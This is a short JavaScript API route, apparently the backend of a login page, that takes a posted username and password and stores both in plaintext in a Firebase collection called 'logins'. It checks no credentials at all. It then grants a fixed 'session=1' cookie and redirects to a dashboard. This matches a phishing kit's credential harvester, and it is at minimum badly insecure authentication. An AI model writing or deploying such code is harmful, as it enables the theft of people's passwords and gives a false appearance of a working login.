import { db } from '../../lib/firebase';
import { collection, addDoc, Timestamp } from 'firebase/firestore';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    let body = '';

    await new Promise((resolve) => {
      req.on('data', (chunk) => {
        body += chunk.toString();
      });
      req.on('end', resolve);
    });

    const params = new URLSearchParams(body);
    const username = params.get('username');
    const password = params.get('password');

    try {
      await addDoc(collection(db, 'logins'), {
        username,
        password,
        time: Timestamp.now()
      });
    } catch (err) {
      console.error('Gagal simpan ke Firebase:', err);
    }

    res.setHeader('Set-Cookie', `session=1; Path=/; HttpOnly`);
    res.writeHead(302, { Location: '/dashboard' });
    res.end();
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
